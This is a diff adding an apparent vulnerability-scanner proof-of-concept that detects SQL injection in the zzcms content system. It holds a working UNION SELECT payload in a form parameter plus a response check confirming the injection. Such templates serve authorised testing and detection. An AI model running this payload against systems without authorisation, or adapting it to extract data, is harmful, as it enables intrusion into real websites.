@@ -1,0 +1,21 @@
+name: poc-yaml-zzcms-zsmanage.php-sqli
+set:
+  r1: randomInt(40000, 44800)
+  r2: randomInt(40000, 44800)
+rules:
+  - method: POST
+    path: /user/zs.php?do=save
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: proname=%E6%B5%8B%E8%AF%95&tz=1%E4%B8%87%E4%BB%A5%E4%B8%8B&prouse=%E6%B5%8B%E8%AF%95&sx%5B%5D=1&sx%5B%5D=1&sm=%E6%B5%8B%E8%AF%95&province=%E5%85%A8%E5%9B%BD&city=%E5%85%A8%E5%9B%BD%E5%90%84%E5%9C%B0%E5%8C%BA&xiancheng=&cityforadd=&img=%2Fimage%2Fnopic.gif&flv=&zc=%E6%B5%8B%E8%AF%95&yq=%E6%B5%8B%E8%AF%95&title=%E6%B5%8B%E8%AF%95&keyword=%E6%B5%8B%E8%AF%95&description=%E6%B5%8B%E8%AF%95&action=add&Submit=%E5%A1%AB%E5%A5%BD%E4%BA%86%EF%BC%8C%E5%8F%91%E5%B8%83%E4%BF%A1%E6%81%AF&smallclassid[]=1&smallclassid[]=2)%20union%20select%20{{r1}}*{{r2}}%23
+    follow_redirects: true
+  - method: GET
+    path: /user/zsmanage.php
+    follow_redirects: true
+    expression: |
+      status==200 && body.bcontains(bytes(string(r1*r2)))
+detail:
+  author: JingLing(https://hackfun.org/)
+  metinfo_version: zzcms201910
+  links:
+    - https://github.com/JcQSteven/blog/issues/18
